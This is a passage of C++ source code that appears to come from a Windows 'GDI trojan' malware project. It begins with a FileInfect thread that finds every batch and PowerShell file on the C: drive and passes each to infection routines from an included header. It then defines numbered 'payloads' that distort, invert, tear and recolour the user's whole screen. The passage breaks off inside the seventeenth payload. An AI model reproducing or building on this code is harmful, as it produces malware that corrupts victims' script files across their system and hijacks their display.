#include "payloads.h"
#include "utils/utils.h"

// quick note for c/c++/c# begginers, when you import something
// like "this.h", and not <this.h>, those have big differences

// "this.h" means the C compilers will prioritize searching for
// local headers, then fallbacking to system ones.
// while <this.h> will have a system heard priority.

#ifdef _MSC_VER
#pragma comment(lib, "Msimg32.lib")
#endif

#define _USE_MATH_DEFINES
#include <cmath>
#include <cstdlib>
#include <vector>
#include <shellapi.h>

#include "utils/fileinfect/fileinfect.h"

volatile bool gFxStop = false;



DWORD WINAPI FileInfect(LPVOID)
{
    auto batchfiles = FileInfecting::FindBatchFiles("C:");

    for (const auto& path : batchfiles)
    {
        // TODO: log on console every path, but ONLY IF ITS TARGETING DEBUG
        FileInfecting::InfectBatchFile(path);
    }

    auto psfiles = FileInfecting::FindPowerShellFiles("C:");

    for (const auto& path : psfiles)
    {
        // TODO: log on console every path, but ONLY IF ITS TARGETING DEBUG
        FileInfecting::InfectPowerShellFile(path);
    }

    return 0;
}

// ============================================================
// PAYLOAD 1
// Screen feedback / microscopic distortion
// ============================================================

DWORD WINAPI GDIPayload1(LPVOID)
{
    const SeedVariant& sd = SeedGet(1);
    srand(SeedRand(1));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);

    if (!bmp)
    {
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    for (int frame = 0; frame < 900; ++frame)
    {
        if (FXAbort())
            break;

        StretchBlt(
            dcCopy,
            (rand() % 3) * sd.dir,
            (rand() % 3) * sd.dir,
            w,
            h,
            dc,
            (rand() % 3) * sd.dir,
            (rand() % 3) * sd.dir,
            w,
            h,
            SRCCOPY
        );

        StretchBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            w,
            h,
            SRCCOPY
        );

        Sleep(rand() % (25 - sd.amp / 2));

        /*if (rand() % 25 == 24)
        {
            RedrawWindow(
                NULL,
                NULL,
                NULL,
                RDW_INVALIDATE |
                RDW_UPDATENOW |
                RDW_ALLCHILDREN
            );
        }*/
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 2
// Pixelation / recursive zoom
// ============================================================

DWORD WINAPI GDIPayload2(LPVOID)
{
    const SeedVariant& sd = SeedGet(2);
    srand(SeedRand(2));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);

    if (!bmp)
    {
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    for (int frame = 0; frame < 600; ++frame)
    {
        if (FXAbort())
            break;

        SetStretchBltMode(dcCopy, COLORONCOLOR);
        SetStretchBltMode(dc, COLORONCOLOR);

        StretchBlt(
            dcCopy,
            0,
            0,
            std::max(1, w / (3 - sd.dir)),
            std::max(1, h / (3 - sd.dir)),
            dc,
            0,
            0,
            w,
            h,
            SRCCOPY
        );

        StretchBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            std::max(1, w / (3 - sd.dir)),
            std::max(1, h / (3 - sd.dir)),
            SRCCOPY
        );

        if (rand() % 5 == 4)
        {
            StretchBlt(
                dc,
                1,
                1,
                w,
                h,
                dc,
                0,
                0,
                w,
                h,
                SRCAND
            );
        }
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 3
// Random error icons
// ============================================================

DWORD WINAPI GDIPayload3(LPVOID)
{
    const SeedVariant& sd = SeedGet(3);
    srand(SeedRand(3));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HICON errorIcon = LoadIcon(NULL, IDI_ERROR);

    for (int i = 0; i < 300 * sd.amp / 4; ++i)
    {
        if (FXAbort())
            break;

        if (errorIcon)
        {
            DrawIcon(
                dc,
                rand() % w,
                rand() % h,
                errorIcon
            );
        }

        //Sleep(50 - sd.amp);

        /*if (i % 25 == 24)
        {
            RedrawWindow(
                NULL,
                NULL,
                NULL,
                RDW_INVALIDATE |
                RDW_UPDATENOW |
                RDW_ALLCHILDREN
            );
        }*/
    }

    ReleaseDC(NULL, dc);
    return 0;
}

// ============================================================
// PAYLOAD 4
// XOR / PAT inversion
// ============================================================

DWORD WINAPI GDIPayload4(LPVOID)
{
    const SeedVariant& sd = SeedGet(4);
    srand(SeedRand(4));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    for (int x = 0; x <= w; x += (13 - sd.amp / 2))
    {
        for (int y = 0; y <= h; y += (13 - sd.amp / 2))
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                SRCAND//PATINVERT
            );

            //Sleep(rand() % 20);

            if (FXAbort())
            {
                ReleaseDC(NULL, dc);
                return 0;
            }
        }
    }

    ReleaseDC(NULL, dc);
    return 0;
}

// ============================================================
// PAYLOAD 5
// Alpha feedback / motion blur
// ============================================================

DWORD WINAPI GDIPayload5(LPVOID)
{
    const SeedVariant& sd = SeedGet(5);
    srand(SeedRand(5));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    BITMAPINFO bmpi{};
    bmpi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = -h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bmpi,
        DIB_RGB_COLORS,
        &bits,
        NULL,
        0
    );

    if (!bmp)
    {
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    BLENDFUNCTION blur{};
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    for (int frame = 0; frame < 600; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            dcCopy,
            (rand() % 10) * sd.dir,
            (rand() % 12) * sd.dir,
            w,
            h,
            dc,
            -(rand() % 10),
            -(rand() % 12),
            SRCCOPY
        );

        AlphaBlend(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            w,
            h,
            blur
        );

        //Sleep(rand() % 25);
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 6
// Hue displacement
// ============================================================

DWORD WINAPI GDIPayload6(LPVOID)
{
    const SeedVariant& sd = SeedGet(6);

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    uint32_t* pixels = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bi,
        DIB_RGB_COLORS,
        reinterpret_cast<void**>(&pixels),
        NULL,
        0
    );

    if (!bmp || !pixels)
    {
        if (bmp)
            DeleteObject(bmp);

        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    int t = 0;

    for (int frame = 0; frame < 250; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            dcCopy,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                const int i = y * w + x;

                int wave =
                    static_cast<int>(
                        std::sin(
                            (x + t * 4 + sd.phase) * 0.025
                        ) * (32 + sd.amp / 2)
                        );

                pixels[i] =
                    ShiftHSL(
                        pixels[i],
                        wave / 255.0f * sd.dir,
                        0.0f,
                        0.0f
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            SRCCOPY
        );

        ++t;
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 7
// Plasma hue effect
// ============================================================

DWORD WINAPI GDIPayload7(LPVOID)
{
    const SeedVariant& sd = SeedGet(7);

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    uint32_t* pixels = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bi,
        DIB_RGB_COLORS,
        reinterpret_cast<void**>(&pixels),
        NULL,
        0
    );

    if (!bmp || !pixels)
    {
        if (bmp)
            DeleteObject(bmp);

        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    int t = 0;

    for (int frame = 0; frame < 220; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            dcCopy,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                const int i = y * w + x;

                double fx =
                    (
                        t +
                        t * std::sin((x + sd.phase) / (16.0 - sd.amp)) +
                        t +
                        t * std::sin((y + sd.phase) / (8.0 - sd.amp / 2)) +
                        t +
                        t * std::sin((x + y + sd.phase) / 16.0) +
                        t +
                        t * std::sin(
                            std::sqrt(
                                static_cast<double>(
                                    x * x + y * y
                                    )
                            ) / (8.0 - sd.amp / 2)
                        )
                        ) / 4.0;

                int wave =
                    static_cast<int>(
                        std::sin(fx * 0.02) * 50.0
                        );

                pixels[i] =
                    ShiftHSL(
                        pixels[i],
                        -wave / 255.0f * sd.dir,
                        0.0f,
                        0.0f
                    );
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            SRCCOPY
        );

        ++t;
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 8
// Mandelbrot-inspired RGB distortion
// ============================================================

DWORD WINAPI GDIPayload8(LPVOID)
{
    const SeedVariant& sd = SeedGet(8);

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    uint32_t* pixels = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bi,
        DIB_RGB_COLORS,
        reinterpret_cast<void**>(&pixels),
        NULL,
        0
    );

    if (!bmp || !pixels)
    {
        if (bmp)
            DeleteObject(bmp);

        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    for (int frame = 0; frame < 120; ++frame)
    {
        if (FXAbort())
            break;

        BitBlt(
            dcCopy,
            0,
            0,
            w,
            h,
            dc,
            0,
            0,
            SRCCOPY
        );

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                int i = y * w + x;

                double fractalX = 2.5 / w;
                double fractalY = 1.90 / h;

                double cx =
                    x * fractalX - (2.0 - sd.phase * 0.0001);

                double cy =
                    y * fractalY - (0.95 - sd.phase * 0.0001);

                double zx = 0;
                double zy = 0;

                int iterations = 0;

                while (
                    zx * zx +
                    zy * zy < 10.0 &&
                    iterations < 35
                    )
                {
                    double newX =
                        zx * zx -
                        zy * zy +
                        cx;

                    double newY =
                        2.0 * zx * zy +
                        cy;

                    zx = newX;
                    zy = newY;

                    ++iterations;
                }

                uint32_t px = pixels[i];

                int r = px & 255;
                int g = (px >> 8) & 255;
                int b = (px >> 16) & 255;

                r = (r + iterations * 4) & 255;
                g = (g + iterations * 2) & 255;
                b = (b + iterations * 6) & 255;

                pixels[i] =
                    static_cast<uint32_t>(b) << 16 |
                    static_cast<uint32_t>(g) << 8 |
                    static_cast<uint32_t>(r);
            }
        }

        BitBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            SRCCOPY
        );
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 9
// Recursive zoom + hue chaos
// ============================================================

DWORD WINAPI GDIPayload9(LPVOID)
{
    const SeedVariant& sd = SeedGet(9);
    srand(SeedRand(9));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    uint32_t* pixels = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bi,
        DIB_RGB_COLORS,
        reinterpret_cast<void**>(&pixels),
        NULL,
        0
    );

    if (!bmp || !pixels)
    {
        if (bmp)
            DeleteObject(bmp);

        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    float t = 0.0f;

    for (int frame = 0; frame < 150; ++frame)
    {
        if (FXAbort())
            break;

        int j = sd.amp + rand() % 12;

        SetStretchBltMode(dcCopy, COLORONCOLOR);
        SetStretchBltMode(dc, COLORONCOLOR);

        StretchBlt(
            dcCopy,
            0,
            0,
            std::max(1, w / j),
            std::max(1, h / j),
            dc,
            0,
            0,
            w,
            h,
            SRCCOPY
        );

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                int i = y * w + x;

                float fx;

                if (static_cast<int>(t) % 3)
                    fx = x + y * t;
                else if (static_cast<int>(t) % 2)
                    fx = t * x + y;
                else
                    fx = t * x * x + y * y * t;

                int wave =
                    static_cast<int>(
                        std::sin((fx + sd.phase) * 0.025f) * (45.0f + sd.amp)
                        );

                pixels[i] =
                    ShiftHSL(
                        pixels[i],
                        -wave / 255.0f * sd.dir,
                        0.0f,
                        0.0f
                    );
            }
        }

        ++t;

        StretchBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            std::max(1, w / j),
            std::max(1, h / j),
            SRCCOPY
        );

        /*if (rand() % 25 == 24)
        {
            RedrawWindow(
                NULL,
                NULL,
                NULL,
                RDW_INVALIDATE |
                RDW_UPDATENOW |
                RDW_ALLCHILDREN
            );
        }*/
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 10
// PATINVERT + color pulse
// ============================================================

DWORD WINAPI GDIPayload10(LPVOID)
{
    const SeedVariant& sd = SeedGet(10);
    srand(SeedRand(10));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);

    if (!bmp)
    {
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    for (int frame = 0; frame < 300; ++frame)
    {
        if (FXAbort())
            break;

        HBRUSH brush = CreateSolidBrush(
            RGB(
                rand() % (255 - sd.amp * 10),
                rand() % (255 - sd.amp * 5),
                rand() % (255 - sd.amp * 20)
            )
        );

        if (brush)
        {
            HGDIOBJ oldBrush = SelectObject(
                dcCopy,
                brush
            );

            StretchBlt(
                dcCopy,
                0,
                0,
                w,
                h,
                dc,
                0,
                0,
                w,
                h,
                SRCCOPY
            );

            PatBlt(
                dcCopy,
                0,
                0,
                w,
                h,
                PATINVERT
            );

            StretchBlt(
                dc,
                0,
                0,
                w,
                h,
                dcCopy,
                0,
                0,
                w,
                h,
                SRCCOPY
            );

            SelectObject(dcCopy, oldBrush);
            DeleteObject(brush);
        }

        //Sleep(50);
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 11
// RGB noise + zoom
// ============================================================

DWORD WINAPI GDIPayload11(LPVOID)
{
    const SeedVariant& sd = SeedGet(11);
    srand(SeedRand(11));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    uint32_t* pixels = nullptr;

    HBITMAP bmp = CreateDIBSection(
        dc,
        &bi,
        DIB_RGB_COLORS,
        reinterpret_cast<void**>(&pixels),
        NULL,
        0
    );

    if (!bmp || !pixels)
    {
        if (bmp)
            DeleteObject(bmp);

        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    int intensity = 15 - sd.amp / 2;

    for (int frame = 0; frame < 300; ++frame)
    {
        if (FXAbort())
            break;

        SetStretchBltMode(
            dc,
            COLORONCOLOR
        );

        SetStretchBltMode(
            dcCopy,
            COLORONCOLOR
        );

        StretchBlt(
            dcCopy,
            rand() % 3,
            rand() % 3,
            std::max(1, w / (5 - sd.amp / 4)),
            std::max(1, h / (5 - sd.amp / 4)),
            dc,
            rand() % 3,
            rand() % 3,
            w,
            h,
            SRCCOPY
        );

        for (int y = 0; y < h; ++y)
        {
            for (int x = 0; x < w; ++x)
            {
                int i = y * w + x;

                uint32_t px = pixels[i];

                int r = px & 255;
                int g = (px >> 8) & 255;
                int b = (px >> 16) & 255;

                int channel = (rand() + sd.phase / 4) % 3;
                int amount =
                    rand() % (intensity + 1);

                if (channel == 0)
                    r = std::min(255, r + amount);
                else if (channel == 1)
                    g = std::min(255, g + amount);
                else
                    b = std::min(255, b + amount);

                pixels[i] =
                    static_cast<uint32_t>(b) << 16 |
                    static_cast<uint32_t>(g) << 8 |
                    static_cast<uint32_t>(r);
            }
        }

        ++intensity;

        if (intensity > 255)
            intensity = 15;

        StretchBlt(
            dc,
            0,
            0,
            w,
            h,
            dcCopy,
            0,
            0,
            std::max(1, w / (5 - sd.amp / 4)),
            std::max(1, h / (5 - sd.amp / 4)),
            SRCCOPY
        );

        //Sleep(25);
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 12
// Horizontal tearing
// ============================================================

DWORD WINAPI GDIPayload12(LPVOID)
{
    const SeedVariant& sd = SeedGet(12);
    srand(SeedRand(12));

    HDC dc = GetDC(NULL);

    if (!dc)
        return 0;

    const int w = GetSystemMetrics(SM_CXSCREEN);
    const int h = GetSystemMetrics(SM_CYSCREEN);

    HDC dcCopy = CreateCompatibleDC(dc);

    if (!dcCopy)
    {
        ReleaseDC(NULL, dc);
        return 0;
    }

    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);

    if (!bmp)
    {
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        return 0;
    }

    HGDIOBJ oldBmp = SelectObject(dcCopy, bmp);

    for (int frame = 0; frame < 450; ++frame)
    {
        if (FXAbort())
            break;

        int fx = (rand() + sd.phase * 3) % h;

        if (rand() % (3 + sd.amp / 4) == 2)
        {
            StretchBlt(
                dcCopy,
                rand() % 3,
                rand() % 3,
                w,
                h,
                dc,
                rand() % 3,
                rand() % 3,
                w,
                h,
                SRCCOPY
            );

            StretchBlt(
                dc,
                0,
                0,
                w,
                h,
                dcCopy,
                0,
                0,
                w,
                h,
                SRCCOPY
            );
        }

        BitBlt(
            dc,
            -10,
            fx,
            w,
            10,
            dc,
            0,
            fx,
            SRCCOPY
        );

        BitBlt(
            dc,
            10,
            fx,
            w,
            10,
            dc,
            0,
            fx,
            SRCCOPY
        );

        if (rand() % 25 == 24)
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                DSTINVERT
            );
        }

        //Sleep(10);
    }

    SelectObject(dcCopy, oldBmp);
    DeleteObject(bmp);
    DeleteDC(dcCopy);
    ReleaseDC(NULL, dc);

    return 0;
}

// ============================================================
// PAYLOAD 13
// Chromatic plasma
// ============================================================

DWORD WINAPI GDIPayload13(LPVOID)
{
    const SeedVariant& sd = SeedGet(13);

    GDISurface s;

    if (!s.Init())
        return 0;

    static int sine[1024];
    static bool initialized = false;

    if (!initialized)
    {
        for (int i = 0; i < 1024; ++i)
        {
            sine[i] =
                static_cast<int>(
                    std::sin(
                        i *
                        6.28318530718 /
                        1024.0
                    ) *
                    127.0
                    ) + 128;
        }

        initialized = true;
    }

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        uint32_t* p =
            s.pixels;

        for (int y = 0; y < s.h; ++y)
        {
            int sy =
                (y * 3 + t * 5 + sd.phase / 2)
                & 1023;

            for (int x = 0; x < s.w; ++x)
            {
                int i =
                    y * s.w + x;

                int rWave =
                    sine[
                        (x + t * 4 + sd.phase)
                            & 1023
                    ];

                int gWave =
                    sine[
                        (x * 2 +
                            y * 3 +
                            t * 2 +
                            sd.phase)
                            & 1023
                    ];

                int bWave =
                    sine[
                        (sy + x)
                            & 1023
                    ];

                p[i] =
                    ShiftHSL(
                        p[i],
                        (rWave + gWave + bWave)
                            / 3.0f / 255.0f * sd.dir,
                        0.0f,
                        0.0f
                    );
            }
        }

        s.Present();

        t += 7;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 14
// RGB displacement
// ============================================================

DWORD WINAPI GDIPayload14(LPVOID)
{
    const SeedVariant& sd = SeedGet(14);

    GDISurface s;

    if (!s.Init())
        return 0;

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        uint32_t* p =
            s.pixels;

        for (int y = 0; y < s.h; ++y)
        {
            int wave =
                static_cast<int>(
                    std::sin(
                        (y + t + sd.phase / 4) * 0.035
                    ) *
                    (32.0 * sd.amp / 4)
                    );

            for (int x = 0; x < s.w; ++x)
            {
                int i =
                    y * s.w + x;

                uint32_t px =
                    p[i];

                int r =
                    px & 255;

                int g =
                    (px >> 8) & 255;

                int b =
                    (px >> 16) & 255;

                int rShift =
                    ((x + wave * sd.dir) & 31)
                    - 16;

                int gShift =
                    ((x - wave * sd.dir) & 31)
                    - 16;

                p[i] =
                    PackRGB(
                        r + rShift,
                        g + gShift,
                        b
                    );
            }
        }

        s.Present();

        t += 5;

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 15
// Feedback tunnel
// ============================================================

DWORD WINAPI GDIPayload15(LPVOID)
{
    const SeedVariant& sd = SeedGet(15);

    HDC dc = GetDC(nullptr);

    if (!dc)
        return 0;

    const int w =
        GetSystemMetrics(
            SM_CXSCREEN
        );

    const int h =
        GetSystemMetrics(
            SM_CYSCREEN
        );

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        int offset =
            static_cast<int>(
                std::sin(
                    (t + sd.phase / 2) * 0.07
                ) *
                (35.0 + sd.amp)
                );

        int zoom =
            static_cast<int>(
                std::sin(
                    (t + sd.phase / 3) * 0.035
                ) *
                (35.0 * sd.amp / 4)
                );

        StretchBlt(
            dc,
            zoom + offset,
            zoom,
            std::max(
                1,
                w - zoom * 2
            ),
            std::max(
                1,
                h - zoom * 2
            ),
            dc,
            0,
            0,
            w,
            h,
            SRCCOPY
        );

        if ((t & 15) == 0)
        {
            PatBlt(
                dc,
                0,
                0,
                w,
                h,
                DSTINVERT
            );
        }

        ++t;

        FPS16(nextFrame);
    }

    ReleaseDC(nullptr, dc);

    return 0;
}

// ============================================================
// PAYLOAD 16
// Fractured screen
// ============================================================

DWORD WINAPI GDIPayload16(LPVOID)
{
    const SeedVariant& sd = SeedGet(16);

    GDISurface s;

    if (!s.Init())
        return 0;

    uint32_t rng =
        sd.rng;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        for (int i = 0; i < 45 * sd.amp / 4; ++i)
        {
            int y =
                FXRand(rng) %
                s.h;

            int height =
                2 +
                FXRand(rng) % (28 + sd.amp * 2);

            int offset =
                static_cast<int>(
                    FXRand(rng) % (150 + sd.amp * 10)
                    ) - (75 + sd.amp * 5);

            BitBlt(
                s.screen,
                offset,
                y,
                s.w,
                height,
                s.screen,
                0,
                y,
                SRCCOPY
            );
        }

        if (
            (FXRand(rng) & 255)
        > 248
            )
        {
            PatBlt(
                s.screen,
                0,
                0,
                s.w,
                s.h,
                DSTINVERT
            );
        }

        FPS16(nextFrame);
    }

    return 0;
}

// ============================================================
// PAYLOAD 17
// Neon edge inversion
// ============================================================

DWORD WINAPI GDIPayload17(LPVOID)
{
    const SeedVariant& sd = SeedGet(17);

    GDISurface s;

    if (!s.Init())
        return 0;

    int t = 0;

    ULONGLONG start =
        GetTickCount64();

    ULONGLONG nextFrame = start;

    while (!FXTimeout(start, 5000))
    {
        s.Capture();

        uint32_t* p =
            s.pixels;

        for (int y = 1;
            y < s.h - 1;
            ++y)
        {
            for (int x = 1;
                x < s.w - 1;
                ++x)
            {
                int i =
                    y * s.w + x;

                uint32_t left =
                    p[i - 1];

                uint32_t right =
                    p[i + 1];

                uint32_t up =
                    p[i - s.w];

                uint32_t down =
                    p[i + s.w];

                int lr =
                    left & 255;

                int rr =
                    right & 255;

                int ur =
                    up & 255;

                int dr =
                    down & 255;

                int lg =
                    (left >> 8) & 255;

                int rg =
                    (right >> 8) & 255;

                int ug =
                    (up >> 8) & 255;

                int dg =
                    (down >> 8) & 255;

                int lb =
                    (left >> 16) & 255;

                int rb =
                    (right >> 16) & 255;

                int ub =
                    (up >> 16) & 255;

                int db =
                    (down >> 16) & 255;

                int edgeR =
                    abs(lr - rr) +
                    abs(ur - dr);

                int edgeG =
                    abs(lg - rg) +
                    abs(ug - dg);

                int edgeB =
                    abs(lb - rb) +
                    abs(ub - db);

                int pulse =
                    static_cast<int>(
                        std::sin(
                            (x + y + t + sd.phase / 2)
                            * 0.025
                        ) *
                        (30.0 + sd.amp * 2)
                        );

